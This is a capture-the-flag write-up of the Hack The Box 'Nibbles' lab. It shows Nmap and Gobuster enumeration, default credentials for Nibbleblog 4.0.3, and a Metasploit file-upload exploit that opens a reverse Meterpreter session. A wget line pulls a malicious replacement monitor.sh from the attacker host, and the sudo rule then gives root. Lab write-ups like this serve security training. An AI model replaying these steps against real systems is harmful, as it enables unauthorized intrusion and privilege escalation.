# Hack The Box — Nibbles

**Machine:** Nibbles
**Difficulty:** Easy
**OS:** Linux
**IP:** `10.129.78.231`

---

## Overview

Nibbles is an Easy-rated Linux machine that demonstrates a classic web application attack chain involving **web enumeration**, **Nibbleblog version identification**, **credential discovery**, **file upload exploitation**, and **Linux privilege escalation through a writable script executed with sudo privileges**.

The initial scan revealed SSH and HTTP. Web enumeration identified a Nibbleblog installation and exposed its version information. A known file-upload vulnerability in Nibbleblog 4.0.3 was then exploited using Metasploit to obtain a Meterpreter session.

After gaining access as the `nibbler` user, `sudo -l` revealed that `monitor.sh` could be executed as root without a password. The script was located inside an archive and could be replaced with a custom script. Executing the modified script with sudo resulted in a root shell.

---

# 1. Reconnaissance

We begin with a basic Nmap scan against the target.

```bash
nmap 10.129.78.231
```

The scan returned:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports were exposed:

* `22` — SSH
* `80` — HTTP

---

# 2. Service Enumeration

Next, we perform service and version detection:

```bash
nmap -sC -sV 10.129.78.231
```

The results showed:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

The HTTP service became the primary target for further enumeration.

---

# 3. Web Enumeration

Opening the website in the browser initially displayed a simple page.

We then inspected the page source and discovered an interesting comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

The `/nibbleblog/` directory immediately became worth investigating.

We also performed directory and file enumeration using Gobuster.

```bash
gobuster dir -u http://10.129.78.231/ \
-w /usr/share/wordlists/dirb/common.txt
```

Interesting paths included:

```text
/README
/admin
/content
```

---

# 4. Identify Nibbleblog

The `README` file revealed the application version:

```text
====== Nibbleblog ======
Version: v4.0.3
```

This was an important discovery because version `4.0.3` has known vulnerabilities.

---

# 5. Enumerating the Username

We investigated the Nibbleblog content directory and found:

```text
http://10.129.78.231/nibbleblog/content/private/users.xml
```

The file revealed the username:

```text
admin
```

We also identified default credentials associated with the Nibbleblog installation:

```text
Username: admin
Password: nibbles
```

This gave us valid credentials for the application.

---

# 6. Nibbleblog File Upload Vulnerability

We searched for vulnerabilities affecting Nibbleblog 4.0.3 and identified a Metasploit module:

```text
exploit/multi/http/nibbleblog_file_upload
```

The module describes a Nibbleblog file upload vulnerability.

We configured the exploit and launched it.

The exploit successfully provided a Meterpreter session:

```text
[*] Started reverse TCP handler on 10.10.15.95:4444
[*] Sending stage (42137 bytes) to 10.129.78.231:4444
[+] Deleted image.php
[*] Meterpreter session 1 opened
```

The session landed inside the vulnerable plugin directory:

```text
/var/www/html/nibbleblog/content/private/plugins/my_image
```

We now had code execution on the target.

---

# 7. Obtaining the User Flag

The compromised account was the `nibbler` user.

We navigated to the user's home directory:

```text
/home/nibbler
```

The `user.txt` file was present.

```bash
cat user.txt
```

This confirmed successful user-level access.

---

# 8. Privilege Escalation

With a shell as `nibbler`, the next step was to enumerate sudo permissions.

```bash
sudo -l
```

The output was:

```text
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

This was the key privilege escalation finding.

The `monitor.sh` script could be executed as `root` without requiring a password.

---

# 9. Investigating monitor.sh

Inside `/home/nibbler`, we found:

```text
personal
personal.zip
user.txt
```

The archive could be extracted:

```bash
unzip personal.zip
```

This created:

```text
personal/
└── stuff/
    └── monitor.sh
```

We inspected the script and confirmed it was the file allowed by the sudo rule.

The important point was that we could manipulate the script.

---

# 10. Replace monitor.sh

We removed the original script:

```bash
rm -rf monitor.sh
```

Then downloaded our replacement script from the attacking machine:

```bash
wget http://10.10.15.95:8000/monitor.sh
```

The replacement script was prepared to spawn a shell.

Once the malicious script was in place, we could execute the exact command permitted by the sudo configuration:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

The command resulted in a root shell:

```text
root@Nibbles:/home/nibbler/personal/stuff#
```

---

# 11. Root Access

We confirmed root access:

```bash
whoami
```

The result was:

```text
root
```

We then moved to the root user's home directory:

```bash
cd /root
ls
```

The `root.txt` flag was present.

```bash
cat root.txt
```

The root flag was successfully retrieved.

---

# Attack Path

```text
Nmap
  ↓
HTTP :80
  ↓
/nibbleblog/
  ↓
Nibbleblog 4.0.3
  ↓
users.xml
  ↓
admin credentials
  ↓
Nibbleblog File Upload
  ↓
Meterpreter
  ↓
nibbler
  ↓
sudo -l
  ↓
NOPASSWD: monitor.sh
  ↓
Replace monitor.sh
  ↓
sudo monitor.sh
  ↓
root
  ↓
root.txt
```

---

# Key Takeaways

* Always inspect the source code of web applications for hidden paths and useful comments.
* Version identification is critical when assessing older web applications.
* Publicly accessible configuration or user files can disclose valid usernames.
* Known vulnerabilities in outdated CMS applications can provide an initial foothold.
* After obtaining Linux access, always run `sudo -l`.
* A `NOPASSWD` rule for a script should immediately be investigated for ownership and writability.
* If a root-executed script can be modified by a low-privileged user, it can provide a direct privilege escalation path.

---

## Tools Used

* Nmap
* Gobuster
* Burp Suite
* Metasploit
* Meterpreter
* SSH
* Wget
* John / password enumeration tools

---

## Conclusion

Nibbles was a good example of how a simple web application can become the entry point for a complete Linux compromise.

The attack started with basic Nmap enumeration and identification of the Nibbleblog installation. Discovering the application version and username information led to exploitation of the file-upload vulnerability and a Meterpreter session.

From there, Linux privilege enumeration revealed a passwordless sudo rule for `monitor.sh`. Because the script could be replaced, executing it through sudo provided a straightforward path to root.

The main lesson from Nibbles is:

**Don't stop after gaining a shell. Always enumerate what that shell can execute with elevated privileges.**
